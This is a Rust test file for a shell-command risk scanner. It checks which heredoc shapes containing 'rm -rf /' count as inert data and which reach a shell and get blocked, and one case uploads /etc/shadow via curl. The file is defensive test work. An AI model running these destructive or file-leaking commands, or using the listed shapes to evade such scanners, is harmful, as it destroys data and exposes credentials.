use super::*;

// Issue #396: `jq` parses its stdin as JSON, never as commands. A
// dangerous-looking substring inside a JSON value (a shell command quoted as
// data) must not be treated as a live command just because it sits inside a
// nowdoc body.
#[test]
fn assess_jq_nowdoc_body_with_dangerous_looking_json_stays_safe() {
    let s = scanner();
    let cmd = "jq -c . <<'JSON'\n{\"cmd\": \"rm -rf /\"}\nJSON";
    let assessment = s.assess(cmd);

    assert_eq!(
        assessment.risk,
        RiskLevel::Safe,
        "expected Safe for a jq nowdoc body, got {:?} ({:?})",
        assessment.risk,
        assessment
            .matched
            .iter()
            .map(|m| m.pattern.id.as_ref())
            .collect::<Vec<_>>()
    );
}

// Issue #432: the heredoc's owning command is found after the last `;`, not
// the line's own first token — `true; cat > f <<'EOF'` must resolve to
// `cat`, so the body is treated as data at rest exactly like a bare
// `cat > f <<'EOF'` already is.
#[test]
fn assess_heredoc_owning_command_after_semicolon_stays_safe() {
    let s = scanner();
    let cmd = "true; cat > /tmp/aegis-396-x.sh <<'EOF'\nrm -rf /\nEOF";
    let assessment = s.assess(cmd);

    assert_eq!(
        assessment.risk,
        RiskLevel::Safe,
        "expected Safe for a heredoc owned by a chained cat, got {:?} ({:?})",
        assessment.risk,
        assessment
            .matched
            .iter()
            .map(|m| m.pattern.id.as_ref())
            .collect::<Vec<_>>()
    );
}

// Same fix, `&&`-chained instead of `;`-chained.
#[test]
fn assess_heredoc_owning_command_after_and_and_stays_safe() {
    let s = scanner();
    let cmd = "true && cat > /tmp/aegis-396-x.sh <<'EOF'\nrm -rf /\nEOF";
    let assessment = s.assess(cmd);

    assert_eq!(
        assessment.risk,
        RiskLevel::Safe,
        "expected Safe for a heredoc owned by an &&-chained cat, got {:?} ({:?})",
        assessment.risk,
        assessment
            .matched
            .iter()
            .map(|m| m.pattern.id.as_ref())
            .collect::<Vec<_>>()
    );
}

// A same-line pipe out of `jq` means `sh` reads whatever `jq` prints — never
// inert, whatever the JSON body says.
#[test]
fn assess_jq_piped_to_shell_still_fires() {
    assert_assessment_matches_pattern(
        "jq -r .a <<'JSON' | sh\n{\"a\": \"rm -rf /\"}\nJSON",
        RiskLevel::Danger,
        "FS-001",
    );
}

// `xargs` is not a `Data consumer` — it turns its stdin into argv for
// whatever program it runs, so a dangerous body must keep firing.
#[test]
fn assess_xargs_nowdoc_body_still_fires() {
    assert_assessment_matches_pattern("xargs <<'EOF'\nrm -rf /\nEOF", RiskLevel::Block, "FS-001");
}

// A `$(...)` that is the right-hand side of a plain assignment is a trusted
// context — the body stays inert.
#[test]
fn assess_cat_inside_assignment_command_substitution_stays_safe() {
    let s = scanner();
    let cmd = "OUT=$(cat <<'EOF'\nrm -rf /\nEOF\n)";
    let assessment = s.assess(cmd);

    assert_eq!(
        assessment.risk,
        RiskLevel::Safe,
        "expected Safe for cat inside an assignment's command substitution, got {:?} ({:?})",
        assessment.risk,
        assessment
            .matched
            .iter()
            .map(|m| m.pattern.id.as_ref())
            .collect::<Vec<_>>()
    );
}

// A `$(...)` that is the value of a `gh` message flag is a trusted context:
// the `gh pr create --body "$(cat <<'EOF' ...)"` idiom.
#[test]
fn assess_cat_inside_gh_argument_command_substitution_stays_safe() {
    let s = scanner();
    let cmd = "gh pr create --body \"$(cat <<'EOF'\nrm -rf /\nEOF\n)\"";
    let assessment = s.assess(cmd);

    assert_eq!(
        assessment.risk,
        RiskLevel::Safe,
        "expected Safe for cat inside a gh argument's command substitution, got {:?} ({:?})",
        assessment.risk,
        assessment
            .matched
            .iter()
            .map(|m| m.pattern.id.as_ref())
            .collect::<Vec<_>>()
    );
}

// A `$(...)` argument of any other command is not a trusted context — `ssh`
// runs whatever text it receives remotely, so the body must keep firing.
#[test]
fn assess_cat_inside_ssh_argument_command_substitution_still_fires() {
    assert_assessment_matches_pattern(
        "ssh host \"$(cat <<'EOF'\nrm -rf /\nEOF\n)\"",
        RiskLevel::Block,
        "FS-001",
    );
}

// A backtick command-substitution position is never a trusted context.
#[test]
fn assess_cat_inside_backtick_substitution_still_fires() {
    assert_assessment_matches_pattern(
        "eval `cat <<'EOF'\nrm -rf /\nEOF\n`",
        RiskLevel::Block,
        "FS-001",
    );
}

// The `git commit -m "$(cat <<'EOF' ...)"` idiom: a `-m` value is only ever
// stored as the commit message.
#[test]
fn assess_cat_inside_git_commit_message_substitution_stays_safe() {
    let s = scanner();
    let cmd = "git commit -m \"$(cat <<'EOF'\nfix: mentions rm -rf in prose only\nEOF\n)\"";
    let assessment = s.assess(cmd);

    assert_eq!(
        assessment.risk,
        RiskLevel::Safe,
        "expected Safe for cat inside a git commit message, got {:?} ({:?})",
        assessment.risk,
        assessment
            .matched
            .iter()
            .map(|m| m.pattern.id.as_ref())
            .collect::<Vec<_>>()
    );
}

// Bodies that reach a shell through a shape the data-consumer predicate must
// reject: a `$(` opened on an earlier line, a process substitution, a line
// continuation into a pipe, and `git`/`gh` arguments that are not message
// values (a `!` alias runs a shell, `gh alias set --shell` stores one).
#[test]
fn assess_data_consumer_bodies_that_reach_a_shell_still_fire() {
    let cases = [
        "$(\ncat <<'EOF'\nrm -rf /\nEOF\n)",
        "eval \"$(\ncat <<'EOF'\nrm -rf /\nEOF\n)\"",
        "cat <<'EOF' > >(sh)\nrm -rf /\nEOF",
        "tee >(sh) <<'EOF'\nrm -rf /\nEOF",
        "cat <<'EOF' \\\n| sh\nrm -rf /\nEOF",
        "git -c \"alias.x=!$(cat <<'EOF'\nrm -rf /\nEOF\n)\" x",
        "gh alias set --shell x \"$(cat <<'EOF'\nrm -rf /\nEOF\n)\"",
        // A `(` frame opened before the marker: process substitution,
        // subshell, or a subshell nested in an assignment's `$(...)`.
        "exec 3< <(\ncat <<'EOF'\nrm -rf /\nEOF\n)",
        "bash <(\ncat <<'EOF'\nrm -rf /\nEOF\n)",
        "source <(\ncat <<'EOF'\nrm -rf /\nEOF\n)",
        "(cat <<'EOF'\nrm -rf /\nEOF\n) | sh",
        "x=$( (cat <<'EOF'\nrm -rf /\nEOF\n) | sh )",
        // Output to a descriptor that may be a pipe opened earlier.
        "cat <<'EOF' >&3\nrm -rf /\nEOF",
        "cat <<'EOF' > /dev/fd/3\nrm -rf /\nEOF",
        // A compound command whose output leaves after the terminator line.
        "{ true; cat <<'EOF'\nrm -rf /\nEOF\n} | sh",
        "exec 3> >(sh)\n{ true; cat <<'EOF'\nrm -rf /\nEOF\n} >&3",
        "for i in 1; do true; cat <<'EOF'\nrm -rf /\nEOF\ndone | sh",
        "if true; then true; cat <<'EOF'\nrm -rf /\nEOF\nfi | sh",
        "exec 3> >(sh)\n{ true; # closed } here\ncat <<'EOF'\nrm -rf /\nEOF\n} >&3",
        "exec > >(sh)\ncat <<'EOF'\nrm -rf /\nEOF",
    ];

    for cmd in cases {
        assert_assessment_matches_pattern(cmd, RiskLevel::Block, "FS-001");
    }

    // The JSON quote right after `/` keeps PS-006 from matching, so FS-001
    // alone decides the level here.
    assert_assessment_matches_pattern(
        "git config alias.y \"!$(jq -r .a <<'JSON'\n{\"a\":\"rm -rf /\"}\nJSON\n)\"",
        RiskLevel::Danger,
        "FS-001",
    );
}

// Issue #396 (capture-then-execute, PR #463 follow-up): `AssignmentRhs`
// trust assumed the captured value stays data. A later `$NAME`/`${NAME}`
// execution of the same command breaks that assumption, so the dangerous
// body must fire once the capture is actually run.
#[test]
fn assess_captured_heredoc_run_via_variable_still_fires() {
    let cases = [
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\n$x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ntrue; $x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\n${x}",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\n\"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\neval \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nbash -c \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nsh -c \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nsource <(echo \"$x\")",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\necho \"$x\" | sh",
    ];
    for cmd in cases {
        assert_assessment_matches_pattern(cmd, RiskLevel::Block, "FS-001");
    }
}

// The motivating #396 shapes stay Safe: a captured value only ever handed
// to `echo`, stored as a `gh`/`git` message value, or sent as a plain flag
// value (`gh api -f`, `curl -d`) never runs.
#[test]
fn assess_captured_heredoc_only_forwarded_stays_safe() {
    let cases = [
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\necho \"$x\"\ngh pr create --body \"$x\"",
        "body=$(jq -c . <<'JSON'\n{\"cmd\": \"rm -rf /\"}\nJSON\n)\ngh api repos/o/r/issues -f body=\"$body\"",
        "body=$(jq -c . <<'JSON'\n{\"cmd\": \"rm -rf /\"}\nJSON\n)\ncurl -d \"$body\" https://example.test",
    ];
    for cmd in cases {
        let s = scanner();
        let assessment = s.assess(cmd);
        assert_eq!(
            assessment.risk,
            RiskLevel::Safe,
            "expected Safe for {cmd:?}, got {:?} ({:?})",
            assessment.risk,
            assessment
                .matched
                .iter()
                .map(|m| m.pattern.id.as_ref())
                .collect::<Vec<_>>()
        );
    }
}

// Commit c696273's forwarding allowlist (ADR-042 item 5, #396 follow-up):
// once a nowdoc is captured into a variable, every later reference to it
// must be provably a forward to a trusted program, or the body stays
// scanned. Each shape below is a way a captured heredoc can still reach a
// shell: a compound-command wrapper, a redirect target, a grouping
// construct, a parameter expansion, a second layer of capture, an alias or
// trap store, a nameref, a here-string, or a write-then-run.
#[test]
fn assess_captured_heredoc_forwarding_allowlist_blocks_indirection_shapes() {
    let cases = [
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\n($x)",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\n{ $x; }",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nif true; then $x; fi",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nfor i in 1; do $x; done",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nsudo $x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nenv $x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncommand $x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nnohup $x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ntime $x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nfind . -maxdepth 0 -exec $x \\;",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ny=$x; $y",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ny=x; ${!y}",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\n${x:-}",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\n${x%%foo}",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nz=$($x)",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nz=`$x`",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\narr=($x)",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ntrap \"$x\" EXIT",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nalias a=\"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nPROMPT_COMMAND=$x",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ndeclare -n r=x; $r",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nbash <<< \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\necho \"$x\" > f.sh; sh f.sh",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nprintf \"%s\" \"$x\" | sh",
    ];
    for cmd in cases {
        assert_assessment_matches_pattern(cmd, RiskLevel::Block, "FS-001");
    }
}

// The allowlist's trusted side (ADR-042 item 5): a captured value handed to
// `gh`/`git`/`curl` as a plain argument or message-flag value never runs,
// so the body stays inert.
#[test]
fn assess_captured_heredoc_forwarding_allowlist_permits_listed_programs() {
    let cases = [
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\necho \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh pr create --body \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh api repos/o/r/issues -f body=\"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl -d \"$x\" https://example.com",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngit commit -m \"$x\"",
    ];
    for cmd in cases {
        let s = scanner();
        let assessment = s.assess(cmd);
        assert_eq!(
            assessment.risk,
            RiskLevel::Safe,
            "expected Safe for {cmd:?}, got {:?} ({:?})",
            assessment.risk,
            assessment
                .matched
                .iter()
                .map(|m| m.pattern.id.as_ref())
                .collect::<Vec<_>>()
        );
    }
}

// Issue #396 review follow-up: PR #463's forwarding allowlist trusted any
// argument of `gh`/`curl`/`jq`, which is wider than what those programs
// actually treat as inline data. `jq -n`/`-f` read the value as program
// text or a file path, `gh --input`/`-F` read or upload a file, and `curl
// -T`/`-K`/`-o`/a bare URL each turn the value into something other than a
// posted body. Each case below must still fire once the capture is used
// this way.
#[test]
fn assess_captured_heredoc_narrow_data_flag_violations_still_fire() {
    let cases = [
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\njq -n \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\njq -f \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh api -X POST --input \"$x\" /repos/x/y/issues",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh api -F body=\"$x\" /repos/x/y/issues",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl -T \"$x\" https://example.com",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl -K \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl -o \"$x\" https://example.com",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl \"$x\"",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nprintf \"$x\"",
    ];
    for cmd in cases {
        assert_assessment_matches_pattern(cmd, RiskLevel::Block, "FS-001");
    }
}

// Same review follow-up: `curl -d`/`--data`* and `gh -F` read an
// `@`-prefixed value as a file to upload, so a captured body that starts
// with `@` must keep firing through those flags even though the same flags
// are trusted for a body that does not. The second body line still says
// `rm -rf /` so FS-001 has something to match once the body stays scanned.
#[test]
fn assess_captured_heredoc_at_prefixed_body_through_narrow_data_flags_still_fires() {
    let cases = [
        "x=$(cat <<'EOF'\n@/etc/shadow\nrm -rf /\nEOF\n)\ncurl -d \"$x\" https://example.com",
        "x=$(cat <<'EOF'\n@/etc/shadow\nrm -rf /\nEOF\n)\ngh api -F body=@\"$x\" /repos/x/y/issues",
    ];
    for cmd in cases {
        assert_assessment_matches_pattern(cmd, RiskLevel::Block, "FS-001");
    }
}

// The allowlist's trusted side under the narrowed rules (issue #396 review
// follow-up): `jq --arg`/`--argjson`, `curl --data-raw` (unconditionally
// trusted, unlike the conditional `-d`/`--data`* flags), and `gh`'s
// `-t`/`-b` title/body flags together.
#[test]
fn assess_captured_heredoc_narrow_data_flag_matches_stay_safe() {
    let cases = [
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\njq -n --arg b \"$x\" '{b:$b}'",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl --data-raw \"$x\" https://example.com",
        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh issue create -t \"$x\" -b \"$x\"",
    ];
    for cmd in cases {
        let s = scanner();
        let assessment = s.assess(cmd);
        assert_eq!(
            assessment.risk,
            RiskLevel::Safe,
            "expected Safe for {cmd:?}, got {:?} ({:?})",
            assessment.risk,
            assessment
                .matched
                .iter()
                .map(|m| m.pattern.id.as_ref())
                .collect::<Vec<_>>()
        );
    }
}
